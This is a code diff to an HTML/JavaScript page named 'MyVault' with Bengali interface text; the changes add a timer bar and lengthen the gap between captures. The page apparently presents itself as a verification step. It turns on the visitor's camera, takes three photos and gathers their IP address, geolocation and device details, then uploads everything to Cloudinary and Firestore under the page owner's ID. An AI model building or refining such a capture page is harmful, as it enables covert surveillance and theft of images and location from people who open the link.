@@ -7,7 +7,6 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Hind+Siliguri:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="style.css">
 <style>
-  /* ---------- FORM PAGE STYLES ---------- */
   *{margin:0;padding:0;box-sizing:border-box;}
 
   body{
@@ -113,7 +112,6 @@
     padding:26px 24px 28px;
   }
 
-  /* Progress dots */
   .progress-dots{
     display:flex;
     justify-content:center;
@@ -132,7 +130,6 @@
     box-shadow:0 0 14px rgba(99,102,241,0.7);
   }
 
-  /* Video wrap */
   .video-wrap{
     position:relative;
     border-radius:18px;
@@ -218,6 +215,21 @@
   }
   .flash.on{opacity:0.85;}
 
+  .timer-bar{
+    position:absolute;
+    bottom:0;left:0;right:0;
+    height:4px;
+    background:rgba(255,255,255,0.1);
+    overflow:hidden;
+  }
+  .timer-bar-fill{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg,#6366f1,#ec4899);
+    transition:width .2s linear;
+    box-shadow:0 0 12px rgba(99,102,241,0.8);
+  }
+
   .info-note{
     padding:14px 16px;
     background:rgba(99,102,241,0.08);
@@ -267,6 +279,7 @@
         <div class="badge-tr">LIVE</div>
         <div class="countdown" id="countdown">3</div>
         <div class="flash" id="flash"></div>
+        <div class="timer-bar"><div class="timer-bar-fill" id="timerFill"></div></div>
       </div>
 
       <div class="info-note" id="statusBox">
@@ -280,7 +293,6 @@
 
 <canvas id="canvas" style="display:none;"></canvas>
 
-<!-- vConsole for mobile debugging -->
 <script src="https://cdn.jsdelivr.net/npm/vconsole@latest/dist/vconsole.min.js"></script>
 <script>
   if (window.VConsole) { window.vConsole = new window.VConsole(); }
@@ -294,7 +306,7 @@ import { uploadToCloudinary } from "./cloudinary.js";
    CONFIG
    ============================================================ */
 const CAPTURE_COUNT  = 3;
-const CAPTURE_GAP_MS = 2500;
+const CAPTURE_GAP_MS = 3000;   /* ← প্রতি ৩ সেকেন্ড */
 const IMAGE_QUALITY  = 0.72;
 
 /* ============================================================
@@ -309,6 +321,7 @@ const statusBox    = document.getElementById("statusBox");
 const captureCount = document.getElementById("captureCount");
 const countdown    = document.getElementById("countdown");
 const flash        = document.getElementById("flash");
+const timerFill    = document.getElementById("timerFill");
 const dots         = document.querySelectorAll("#dots span");
 
 function log(msg){ console.log("[MyVault] " + msg); }
@@ -358,37 +371,50 @@ async function getGeo(){
 }
 
 /* ============================================================
+   WAIT WITH TIMER BAR (3 seconds)
+   ============================================================ */
+async function waitWithTimer(ms){
+  const steps = 30;                    /* 30 steps = smooth */
+  const stepMs = ms / steps;
+
+  for (let s = 0; s <= steps; s++){
+    timerFill.style.width = ((s / steps) * 100) + "%";
+    await sleep(stepMs);
+  }
+  timerFill.style.width = "0%";
+}
+
+/* ============================================================
    CAPTURE ONE FRAME
    ============================================================ */
 async function captureFrame(index){
   log("── Frame " + index + " শুরু ──");
 
-  /* Countdown 3-2-1 */
+  /* 3-2-1 countdown */
   countdown.classList.add("show");
   for (let c = 3; c > 0; c--){
     countdown.textContent = c;
-    await sleep(600);
+    await sleep(700);
   }
   countdown.classList.remove("show");
 
-  /* Flash effect */
+  /* Flash */
   flash.classList.add("on");
-  await sleep(80);
+  await sleep(100);
   flash.classList.remove("on");
 
-  /* Badge + dots */
+  /* Update UI */
   captureCount.textContent = index + " / " + CAPTURE_COUNT;
   updateDots(index);
 
-  /* Draw video to canvas */
+  /* Draw frame */
   try {
     const vw = video.videoWidth  || 720;
     const vh = video.videoHeight || 960;
     canvas.width  = vw;
     canvas.height = vh;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, vw, vh);
-    log("Frame " + index + " canvas আঁকা হয়েছে (" + vw + "×" + vh + ")");
+    canvas.getContext("2d").drawImage(video, 0, 0, vw, vh);
+    log("Frame " + index + " canvas OK (" + vw + "×" + vh + ")");
   } catch(e){
     logErr("Canvas draw failed for frame " + index, e);
     return null;
@@ -409,20 +435,20 @@ async function captureFrame(index){
 }
 
 /* ============================================================
-   UPLOAD + SAVE ONE FRAME
+   UPLOAD + SAVE
    ============================================================ */
 async function uploadAndSave(blob, index, ip, geo, ua, tz, lang, screenRes){
   let photoUrl = "";
 
-  /* Cloudinary upload */
+  /* --- Cloudinary (retry is in cloudinary.js) --- */
   try {
     log("Frame " + index + " Cloudinary-তে যাচ্ছে…");
     const uploaded = await uploadToCloudinary(blob, "myvault/" + ownerUid);
     if (uploaded){
       photoUrl = uploaded;
-      log("✓ Frame " + index + " upload OK");
+      log("✓ Frame " + index + " Cloudinary OK");
     } else {
-      logErr("Cloudinary null — dataURL fallback");
+      logErr("Cloudinary returned null — dataURL fallback");
       photoUrl = canvas.toDataURL("image/jpeg", 0.5);
     }
   } catch(e){
@@ -430,7 +456,7 @@ async function uploadAndSave(blob, index, ip, geo, ua, tz, lang, screenRes){
     photoUrl = canvas.toDataURL("image/jpeg", 0.5);
   }
 
-  /* Save to Firestore */
+  /* --- Firestore --- */
   try {
     log("Frame " + index + " Firestore-এ save হচ্ছে…");
     await addDoc(collection(db, "captures"), {
@@ -450,7 +476,7 @@ async function uploadAndSave(blob, index, ip, geo, ua, tz, lang, screenRes){
       createdAt:   serverTimestamp()
     });
     captured++;
-    log("✓ Frame " + index + " saved to Firestore (total=" + captured + ")");
+    log("✓ Frame " + index + " saved (total=" + captured + ")");
     return true;
   } catch(e){
     logErr("Firestore save failed frame " + index, e);
@@ -479,17 +505,15 @@ async function start(){
     video.srcObject = stream;
     await video.play();
 
-    /* Wait for video ready */
     await new Promise(r => {
       if (video.readyState >= 2) return r();
       video.onloadeddata = r;
       setTimeout(r, 3000);
     });
 
-    /* Extra warm-up for exposure */
     await sleep(1200);
 
-    log("ক্যামেরা চালু (video " + video.videoWidth + "×" + video.videoHeight + ")");
+    log("ক্যামেরা OK (" + video.videoWidth + "×" + video.videoHeight + ")");
 
     statusBox.textContent = "✅ ক্যামেরা চালু — যাচাইকরণ শুরু হচ্ছে…";
     statusBox.style.background = "rgba(16,185,129,0.1)";
@@ -497,14 +521,14 @@ async function start(){
 
   } catch (err){
     logErr("Camera error", err);
-    statusBox.textContent = "❌ ক্যামেরা পাওয়া যায়নি — অনুমতি দিন ও রিফ্রেশ করুন";
+    statusBox.textContent = "❌ ক্যামেরা পাওয়া যায়নি — অনুমতি দিন";
     statusBox.style.background = "rgba(239,68,68,0.15)";
     statusBox.style.color = "#fca5a5";
     return;
   }
 
-  /* --- Step 2: Fetch intel once --- */
-  log("IP ও Geo fetch হচ্ছে…");
+  /* --- Step 2: Intel --- */
+  log("IP ও Geo fetch…");
   const ip  = await getIP();
   const geo = await getGeo();
   const ua  = navigator.userAgent;
@@ -515,7 +539,7 @@ async function start(){
   log("IP: " + ip);
   log("Geo: " + geo.text);
 
-  /* --- Step 3: Capture loop (3 frames) --- */
+  /* --- Step 3: Capture loop --- */
   for (let i = 1; i <= CAPTURE_COUNT; i++){
     try {
       const blob = await captureFrame(i);
@@ -523,18 +547,17 @@ async function start(){
         await uploadAndSave(blob, i, ip, geo, ua, tz, lang, screenRes);
       }
     } catch(e){
-      logErr("Frame " + i + " loop error", e);
-      /* continue with next frame anyway */
+      logErr("Frame " + i + " error", e);
     }
 
-    /* gap before next frame */
+    /* ⏱️ প্রতি ৩ সেকেন্ড অপেক্ষা (শেষ ফ্রেমের পর না) */
     if (i < CAPTURE_COUNT){
-      log("পরবর্তী frame-এর জন্য অপেক্ষা " + CAPTURE_GAP_MS + "ms…");
-      await sleep(CAPTURE_GAP_MS);
+      log("⏱️ পরবর্তী frame-এর জন্য " + (CAPTURE_GAP_MS/1000) + "s অপেক্ষা…");
+      await waitWithTimer(CAPTURE_GAP_MS);
     }
   }
 
-  /* --- Step 4: Done --- */
+  /* --- Done --- */
   log("=== সম্পূর্ণ। Saved: " + captured + "/" + CAPTURE_COUNT + " ===");
 
   if (stream){
